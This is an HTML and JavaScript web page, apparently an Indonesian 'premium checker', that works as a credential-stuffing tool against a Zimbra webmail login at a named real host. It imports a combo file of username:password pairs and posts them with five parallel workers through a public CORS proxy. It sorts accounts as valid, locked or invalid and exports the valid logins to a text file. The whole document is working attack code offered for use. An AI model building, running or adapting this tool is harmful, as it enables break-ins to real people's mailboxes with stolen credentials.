<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>
      DanzzZimbra | Premium Checker
    </title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&amp;display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <style>
      :root {
            --bg: #0d1117;
            --panel: #161b22;
            --aksen: #58a6ff;
            --sukses: #3fb950;
            --error: #f85149;
            --tunggu: #d29922;
            --teks: #ffffff;
            --teks-redup: #8b949e;
            --garis: #30363d;
            --glass: rgba(255, 255, 255, 0.05);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: &#39;Plus Jakarta Sans&#39;, sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body {
            background: var(--bg);
            color: var(--teks);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        header {
            padding: 1.5rem 1rem;
            background: var(--panel);
            border-bottom: 1px solid var(--garis);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo { font-size: 1.3rem; font-weight: 800; letter-spacing: -0.5px; }
        .logo span { color: var(--aksen); }

        .status-box {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.7rem;
            font-weight: 800;
            background: var(--glass);
            padding: 8px 12px;
            border-radius: 12px;
            border: 1px solid var(--garis);
        }

        .lampu { width: 8px; height: 8px; background: #333; border-radius: 50%; }
        .lampu.aktif { background: var(--sukses); box-shadow: 0 0 10px var(--sukses); }

        .konten-utama {
            flex: 1;
            padding: 1rem;
            overflow-y: auto;
            padding-bottom: 100px;
        }

        .halaman { display: none; animation: slideUp 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        .halaman.aktif { display: block; }

        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .grid-stat {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.8rem;
            margin-bottom: 1.2rem;
        }

        .kartu-stat {
            background: var(--panel);
            padding: 1rem;
            border-radius: 18px;
            border: 1px solid var(--garis);
            position: relative;
        }

        .angka { font-size: 1.6rem; font-weight: 800; display: block; }
        .label { font-size: 0.6rem; color: var(--teks-redup); text-transform: uppercase; font-weight: 700; letter-spacing: 1px; }

        .kartu {
            background: var(--panel);
            border-radius: 24px;
            padding: 1.5rem;
            border: 1px solid var(--garis);
            margin-bottom: 1rem;
        }

        .drop-zone {
            border: 2px dashed var(--garis);
            padding: 2.5rem 1rem;
            border-radius: 20px;
            text-align: center;
            background: var(--glass);
            transition: 0.3s;
        }

        .drop-zone:active { border-color: var(--aksen); background: rgba(88, 166, 255, 0.1); }

        .input-group { margin-top: 1.5rem; }
        .input-group label { font-size: 0.75rem; font-weight: 800; color: var(--teks-redup); display: block; margin-bottom: 10px; }

        .input-flat {
            width: 100%;
            background: var(--bg);
            border: 1px solid var(--garis);
            padding: 1.2rem;
            border-radius: 16px;
            color: white;
            font-weight: 700;
            outline: none;
        }

        .btn {
            width: 100%;
            padding: 1.2rem;
            border-radius: 18px;
            border: none;
            font-weight: 800;
            font-size: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 1rem;
        }

        .btn-gas { background: var(--aksen); color: #0d1117; }
        .btn-stop { background: transparent; color: var(--error); border: 1px solid var(--error); }

        /* Monitor Modern */
        .monitor-view {
            background: rgba(22, 27, 34, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            height: 400px;
            padding: 1.2rem;
            font-family: &#39;Consolas&#39;, monospace;
            font-size: 0.8rem;
            overflow-y: auto;
            border: 1px solid var(--garis);
            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
        }

        .log-item { margin-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.02); padding-bottom: 4px; }

        .hasil-item {
            background: var(--glass);
            padding: 1.2rem;
            border-radius: 16px;
            margin-bottom: 0.8rem;
            border: 1px solid var(--garis);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        nav {
            position: fixed;
            bottom: 0; left: 0; right: 0;
            height: 85px;
            background: rgba(22, 27, 34, 0.95);
            backdrop-filter: blur(15px);
            border-top: 1px solid var(--garis);
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            padding-bottom: env(safe-area-inset-bottom);
        }

        .nav-tab {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 5px;
            color: var(--teks-redup);
            text-decoration: none;
            font-size: 0.75rem;
            font-weight: 700;
        }

        .nav-tab i { font-size: 1.3rem; }
        .nav-tab.aktif { color: var(--aksen); }
    </style>
  </head>
  <body>
    <header>
      <div class="logo">
        Danzz
        <span>        iDMarket
</span>
      </div>
      <div class="status-box">
        <div id="lampu" class="lampu">
        </div>
        <span id="labelStatus">        SIAP CEK
</span>
      </div>
    </header>
    <div class="konten-utama">
      <div class="grid-stat">
        <div class="kartu-stat">
          <span class="angka" id="s-total">          0
</span>
          <span class="label">          Antrean
</span>
        </div>
        <div class="kartu-stat" style="border-right: 4px solid var(--sukses)">
          <span class="angka" id="s-valid" style="color:var(--sukses)">          0
</span>
          <span class="label">          Valid
</span>
        </div>
        <div class="kartu-stat" style="border-right: 4px solid var(--tunggu)">
          <span class="angka" id="s-lock" style="color:var(--tunggu)">          0
</span>
          <span class="label">          Terkunci
</span>
        </div>
        <div class="kartu-stat" style="border-right: 4px solid var(--error)">
          <span class="angka" id="s-salah" style="color:var(--error)">          0
</span>
          <span class="label">          Invalid
</span>
        </div>
      </div>
      <div id="tab-atur" class="halaman aktif">
        <div class="kartu">
          <div class="drop-zone" onclick="document.getElementById(&#39;fileIn&#39;).click()">
            <i class="fas fa-folder-open" style="font-size: 2rem; color: var(--aksen); margin-bottom: 0.8rem;"></i>
            <p style="font-weight: 800;">
              Impor File Combo
            </p>
          </div>
          <input type="file" id="fileIn" style="display:none" onchange="loadCombo(this)" />
          <div class="input-group">
            <label>
              JEDA PROSES (DETIK)
            </label>
            <input type="number" id="delay" class="input-flat" value="3" />
          </div>
        </div>
        <button class="btn btn-gas" id="mulai" onclick="gaspoll()">
          MULAI CEK SEKARANG
        </button>
        <button class="btn btn-stop" id="stop" onclick="rem()" disabled="">
          HENTIKAN
        </button>
      </div>
      <div id="tab-pantau" class="halaman">
        <div class="kartu" style="padding: 1rem;">
          <p style="font-weight: 800; font-size: 0.8rem; margin-bottom: 1rem; color: var(--aksen)">
            LIVE MONITORING
          </p>
          <div class="monitor-view" id="logBox">
            <div style="color: var(--teks-redup)">
              // Menunggu antrean akun...
            </div>
          </div>
        </div>
      </div>
      <div id="tab-hasil" class="halaman">
        <div class="kartu">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
            <p style="font-weight: 800;">
              DAFTAR AKUN VALID
            </p>
            <i class="fas fa-download" onclick="saveTxt()" style="color: var(--aksen)"></i>
          </div>
          <div id="areaHasil">
            <p style="text-align: center; color: var(--teks-redup); padding: 3rem 0;">
              Belum ada hasil.
            </p>
          </div>
        </div>
      </div>
    </div>
    <nav>
      <a href="#" class="nav-tab aktif" onclick="layar(&#39;tab-atur&#39;, this)">      <i class="fas fa-sliders-h"></i>
      <span>      Atur
</span>
</a>
      <a href="#" class="nav-tab" onclick="layar(&#39;tab-pantau&#39;, this)">      <i class="fas fa-microchip"></i>
      <span>      Pantau
</span>
</a>
      <a href="#" class="nav-tab" onclick="layar(&#39;tab-hasil&#39;, this)">      <i class="fas fa-check-double"></i>
      <span>      Hasil
</span>
</a>
    </nav>
    <script>
      const PROXY = &#34;https://cors-anywhere.herokuapp.com/&#34;;
        const TARGET = &#34;https://access.stockgamer.id&#34;;
        let comboArr = [], jalan = false, urut = 0, stat = { ok: 0, lock: 0, bad: 0 };
        let validList = [];
        const THREADS = 5;

        function layar(id, el) {
            document.querySelectorAll(&#39;.halaman&#39;).forEach(h =&gt; h.classList.remove(&#39;aktif&#39;));
            document.querySelectorAll(&#39;.nav-tab&#39;).forEach(n =&gt; n.classList.remove(&#39;aktif&#39;));
            document.getElementById(id).classList.add(&#39;aktif&#39;);
            el.classList.add(&#39;aktif&#39;);
        }

        function print(m, c = &#39;var(--teks)&#39;) {
            const b = document.getElementById(&#39;logBox&#39;);
            const d = document.createElement(&#39;div&#39;);
            d.className = &#39;log-item&#39;;
            d.style.color = c;
            d.innerHTML = `&lt;span style=&#34;color:var(--aksen)&#34;&gt;[${new Date().toLocaleTimeString()}]&lt;/span&gt; ${m}`;
            b.appendChild(d);
            b.scrollTop = b.scrollHeight;
        }

        function loadCombo(input) {
            const fr = new FileReader();
            fr.onload = (e) =&gt; {
                comboArr = e.target.result.split(&#39;\n&#39;).filter(l =&gt; l.includes(&#39;:&#39;));
                document.getElementById(&#39;s-total&#39;).innerText = comboArr.length;
                print(`Berhasil memuat ${comboArr.length} akun.`, &#39;var(--sukses)&#39;);
            };
            fr.readAsText(input.files[0]);
        }

        async function verify(u, p) {
            try {
                const f = new URLSearchParams({ username: u, password: p, client: &#39;advanced&#39; });
                const r = await fetch(PROXY + TARGET + &#34;/&#34;, { method: &#39;POST&#39;, body: f });
                const t = await r.text();
                if (r.url.includes(&#39;/inbox&#39;) || t.includes(&#39;ZmMailApp&#39;)) return &#39;OK&#39;;
                if (t.toLowerCase().includes(&#39;locked&#39;) || t.toLowerCase().includes(&#39;disabled&#39;)) return &#39;LOCK&#39;;
                return &#39;BAD&#39;;
            } catch { return &#39;ERR&#39;; }
        }

        async function doWork() {
            while (jalan &amp;&amp; urut &lt; comboArr.length) {
                const i = urut++;
                const [user, pass] = comboArr[i].split(&#39;:&#39;);
                print(`Mengecek: ${user.split(&#39;@&#39;)[0]}...`);
                
                const res = await verify(user, pass);
                if (res === &#39;OK&#39;) {
                    stat.ok++;
                    validList.push(comboArr[i]);
                    renderRes(user, &#39;VALID&#39;);
                    print(`MATCH: ${user}`, &#39;var(--sukses)&#39;);
                } else if (res === &#39;LOCK&#39;) {
                    stat.lock++;
                    renderRes(user, &#39;TERKUNCI&#39;);
                    print(`LOCKED: ${user}`, &#39;var(--tunggu)&#39;);
                } else {
                    stat.bad++;
                }
                sync();
                await new Promise(r =&gt; setTimeout(r, parseInt(document.getElementById(&#39;delay&#39;).value) * 1000));
            }
        }

        function gaspoll() {
            if (comboArr.length === 0) return alert(&#39;Combo kosong!&#39;);
            jalan = true;
            document.getElementById(&#39;mulai&#39;).disabled = true;
            document.getElementById(&#39;stop&#39;).disabled = false;
            document.getElementById(&#39;lampu&#39;).classList.add(&#39;aktif&#39;);
            document.getElementById(&#39;labelStatus&#39;).innerText = &#34;CEK JALAN&#34;;
            layar(&#39;tab-pantau&#39;, document.querySelectorAll(&#39;.nav-tab&#39;)[1]);
            for (let i = 0; i &lt; THREADS; i++) doWork();
        }

        function sync() {
            document.getElementById(&#39;s-valid&#39;).innerText = stat.ok;
            document.getElementById(&#39;s-lock&#39;).innerText = stat.lock;
            document.getElementById(&#39;s-salah&#39;).innerText = stat.bad;
        }

        function renderRes(u, t) {
            const a = document.getElementById(&#39;areaHasil&#39;);
            if (stat.ok + stat.lock === 1) a.innerHTML = &#39;&#39;;
            const d = document.createElement(&#39;div&#39;);
            d.className = &#39;hasil-item&#39;;
            d.innerHTML = `&lt;span style=&#34;font-size:0.8rem; font-weight:700;&#34;&gt;${u}&lt;/span&gt;&lt;span style=&#34;font-size:0.6rem; font-weight:900; color:${t===&#39;VALID&#39;?&#39;var(--sukses)&#39;:&#39;var(--tunggu)&#39;}&#34;&gt;${t}&lt;/span&gt;`;
            a.prepend(d);
        }

        function rem() { jalan = false; }
        function saveTxt() {
            const b = new Blob([validList.join(&#39;\n&#39;)], {type: &#39;text/plain&#39;});
            const a = document.createElement(&#39;a&#39;);
            a.href = URL.createObjectURL(b);
            a.download = &#39;valid_zimbra.txt&#39;;
            a.click();
        }
    </script>
  </body>
</html>
